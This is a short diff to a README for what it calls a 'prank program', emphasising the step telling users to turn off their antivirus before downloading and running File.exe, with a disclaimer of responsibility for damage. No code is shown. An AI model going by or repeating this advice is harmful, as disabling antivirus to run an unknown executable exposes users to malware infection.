@@ -7,7 +7,7 @@ This is just a prank program, and I am not responsible for any damage caused by 
 **Always download from Releases tab**
 
 # How to run
-1. Turn off your antivirus
+1. **Turn off your antivirus**
 2. Download File.exe or File.zip
 3. Open the File.exe or extract and open File.exe
 4. Good luck :)
